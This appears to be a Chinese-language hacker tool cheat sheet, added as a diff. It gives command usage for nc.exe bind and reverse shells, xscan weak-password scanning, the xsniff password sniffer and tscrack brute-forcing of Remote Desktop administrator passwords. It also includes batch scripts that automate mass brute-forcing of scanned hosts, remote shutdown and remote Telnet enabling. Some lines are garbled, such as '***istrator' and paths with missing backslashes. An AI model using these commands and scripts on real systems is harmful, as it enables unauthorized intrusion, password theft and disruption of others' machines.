@@ -1,0 +1,132 @@
+1、瑞士军刀：nc.exe 
+参数说明： 
+-h 查看帮助信息 
+-d 后台模式 
+-e prog程序重定向，一但连接就执行〔危险〕 
+-i secs延时的间隔 
+-l 监听模式，用于入站连接 
+-L 监听模式，连接天闭后仍然继续监听，直到CTR+C 
+-n IP地址，不能用域名 
+-o film记录16进制的传输 
+-p[空格]端口 本地端口号 
+-r 随机本地及远程端口 
+-t 使用Telnet交互方式 
+-u UDP模式 
+-v 详细输出，用-vv将更详细 
+-w数字 timeout延时间隔 
+-z 将输入，输出关掉（用于扫锚时） 
+基本用法： 
+nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口 
+nc -l -p 80 开启本机的TCP 80端口并监听 
+nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口 
+nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口 
+nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口 
+高级用法： 
+nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 
+nc -L -p 80 > c:\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txt 
+nc -L -p 80 < c:\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中，亦可起到传送文件作用 
+type.exe c:\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中,亦可起到传送文件作用 
+本机上用：nc -l -p 本机端口 
+在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K 
+nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙 
+本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称 
+在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机 
+备 注： 
+| 管道命令 
+< 或 > 重定向命令。“<”，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令 
+＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\winnt >> d:\log.txt 意思是：后台执行dir，并把结果存在d:\log.txt中 
+>与>>的区别 　">"指：覆盖；">>"指：保存到(添加到）。 
+如：@dir c:\winnt >> d:\log.txt和@dir c:\winnt > d:\log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。 
+2、扫锚工具：xscan.exe 
+基本格式 
+xscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚"起始IP到终止IP"段的所有主机信息 
+xscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚"主机IP列表文件名"中的所有主机信息 
+
+
+检测项目 
+-active 检测主机是否存活 
+-os 检测远程操作系统类型（通过NETBIOS和SNMP协议） 
+-port 检测常用服务的端口状态 
+-ftp 检测FTP弱口令 
+-pub 检测FTP服务匿名用户写权限 
+-pop3 检测POP3-Server弱口令 
+-smtp 检测SMTP-Server漏洞 
+-sql 检测SQL-Server弱口令 
+-smb 检测NT-Server弱口令 
+-iis 检测IIS编码/解码漏洞 
+-cgi 检测CGI漏洞 
+-nasl 加载Nessus攻击脚本 
+-all 检测以上所有项目 
+其它选项 
+-i 适配器编号 设置网络适配器, <适配器编号>可通过"-l"参数获取 
+-l 显示所有网络适配器 
+-v 显示详细扫描进度 
+-p 跳过没有响应的主机 
+-o 跳过没有检测到开放端口的主机 
+　 -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10 
+-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件) 
+用法示例 
+xscan -host 192.168.1.1-192.168.255.255 -all -active -p　 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机 
+xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机 
+xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机 
+命令行方式嗅探器: xsniff.exe 
+可捕获局域网内FTP/SMTP/POP3/HTTP协议密码 
+参数说明 
+-tcp 输出TCP数据报 
+-udp 输出UDP数据报 
+-icmp 输出ICMP数据报 
+-pass 过滤密码信息 
+-hide 后台运行 
+-host 解析主机名 
+-addr IP地址 过滤IP地址 
+-port 端口 过滤端口 
+-log 文件名 将输出保存到文件 
+-asc 以ASCII形式输出 
+-hex 以16进制形式输出 
+用法示例 
+xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中 
+xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出 
+4、终端服务密码破解: tscrack.exe 
+参数说明 
+-h 显示使用帮助 
+-v 显示版本信息 
+-s 在屏幕上打出解密能力 
+-b 密码错误时发出的声音 
+-t 同是发出多个连接（多线程） 
+-N Prevent System Log entries on targeted server 
+-U 卸载移除tscrack组件 
+-f 使用－f后面的密码 
+-F 间隔时间（频率） 
+-l 使用－l后面的用户名 
+-w 使用－w后面的密码字典 
+-p 使用－p后面的密码 
+-D 登录主页面 
+用法示例 
+tscrack 192.168.0.1 -l ***istrator -w pass.dic 远程用密码字典文件暴破主机的***istrator的登陆密码 
+tscrack 192.168.0.1 -l ***istrator -p 123456 用密码123456远程登陆192.168.0.1的***istrator用户 
+@if not exist ipcscan.txt goto noscan 
+@for /f "tokens=1 delims= " %%i in (3389.txt) do call hack.bat %%i 
+nscan 
+@echo 3389.txt no find or scan faild 
+(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt) 
+3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat 
+@if not exist tscrack.exe goto noscan 
+@tscrack %1 -l ***istrator -w pass.dic >>rouji.txt 
+:noscan 
+@echo tscrack.exe no find or scan faild 
+(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了) 
+hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的***istrator密码，并将破解结果保存在rouji.txt文件中。 
+5、其它： 
+Shutdown.exe 
+Shutdown \\IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。） 
+fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙） 
+fpipe -l 80 -s 1029 -r 80 www.sina.com.cn 当有人扫锚你的80端口时，他扫到的结果会完全是www.sina.com.cn的主机信息 
+Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。 
+OpenTelnet.exe (远程开启telnet工具) 
+opentelnet.exe \\IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet \\ip 连接上对方。 
+NTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。 
+ResumeTelnet.exe (OpenTelnet附带的另一个工具) 
+resumetelnet.exe \\IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。 
+#10 十： 
+
+
